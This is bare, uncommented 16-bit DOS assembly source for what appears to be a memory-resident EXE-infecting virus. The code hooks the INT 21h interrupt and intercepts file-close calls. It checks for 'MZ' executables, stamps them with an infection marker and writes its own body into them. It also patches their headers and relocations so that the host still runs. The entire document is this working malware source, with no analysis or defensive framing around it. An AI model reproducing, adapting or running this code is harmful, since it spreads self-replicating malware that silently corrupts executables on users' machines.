

        .286
        .radix  16
assume  cs:gluk,ds:gluk
gluk    segment
        org     0
exe:    call    uu
uu:     pop     si
        sub     si,3
        push    cs
        push    si

        pusha
        push    ds
        push    es

        push    ds
        push    si
        push    cs

        push    cs
        mov     ax,ds:[2c]
        pop     ds
        xor     si,si
        mov     es,si
        mov     di,200
        mov     cx,180
        mov     bp,cx
        rep     movsb
        mov     ds,cx
        mov     si,21*4
        cmp     ds:[si+2],word ptr 20
        jz      no
        movsw
        movsw
no:     db      0ea
        dw      cud
        dw      20

cud:    mov     es,ax
        mov     ds,ax
        xor     di,di
        mov     al,1
        dec     cx
        repnz   scasb
        mov     dx,di
        inc     dx
        mov     ax,3d00
        int     21
        mov     bx,ax
        xor     cx,cx
        mov     dx,cs:len
        mov     ax,4200
        int     21
        pop     ds
        pop     dx
        mov     ah,3f
        mov     cx,bp
        int     21
        xor     cx,cx
        mov     di,cs:reloc
        mov     dx,di
        mov     ax,4200
        int     21
        pop     si
        add     si,10
        push    cs
        pop     ds
        mov     dx,384
        mov     di,dx
        mov     cx,4
        mov     ax,ds:old
        or      ax,ax
        jz      fg

cic:    push    ax
        mov     ah,3f
        int     21
        mov     ax,ds:[di+2]
        add     ax,si
        mov     es,ax
        mov     bp,ds:[di]
        add     es:[bp],si
        pop     ax
        dec     ax
        jnz     cic
fg:     mov     ds,ax
        mov     ds:[21*4+2],cs
        mov     WORD PTR ds:[21*4],offset start
        mov     ah,3e
        push    es
        call    cs:dword ptr [180]
        pop     es
        pop     ds
        popa
        retf

e:      jmp     en
start:  cmp     ah,3e
        jz      st1
j:      jmp     cs:dword ptr [180]
st1:    push    ds
        pusha

        mov     di,180
        xor     dx,dx
        mov     ax,0c000-18
        mov     ds,ax

        mov     cx,dx
        mov     bp,4200
        mov     ax,bp
        int     21

        mov     cx,di
        mov     ah,3f
        int     21

        cmp     ds:[0],'ZM'
        jnz     e
        mov     si,4533
        cmp     ds:[2],si
        jz      e
        mov     ax,ds:[6]
        mov     cs:old,ax
        shr     ax,2
        sub     ax,ds:[8]
        cmp     ax,-18-2
        jnc     e
        mov     ds:[2],si

        mov     ds:[6],dx
        xor     cx,cx
        mov     ax,bp
        int     21

        mov     cx,1c
        mov     ah,40
        int     21

        mov     cx,ds:[16]
        rol     cx,4
        mov     dx,cx
        and     cx,0f
        and     dx,0fff0
        add     dx,ds:[14]

        mov     ax,ds:[18]
        mov     cs:reloc,ax

        mov     ax,bp
        mov     si,ds:[8]
        shl     si,4
        add     dx,si
        adc     cx,0
        push    cx
        push    dx
        int     21
        mov     cx,di
        mov     ah,3f
        int     21
        pop     dx
        pop     cx
        mov     ax,bp
        int     21
        push    ds
        push    cs
        pop     ds
        mov     ah,40
        mov     cx,di
        sub     si,cx
        mov     ds:len,si
        push    si
        int     21
        pop     dx
        pop     ds
        xor     cx,cx
        mov     ax,bp
        int     21
        xor     dx,dx
        mov     cx,di
        mov     ah,40
        int     21

en:     popa
        pop     ds
        jmp     j

old     dw      0
len     dw      0
reloc   dw      0

gluk    ends
        end     exe

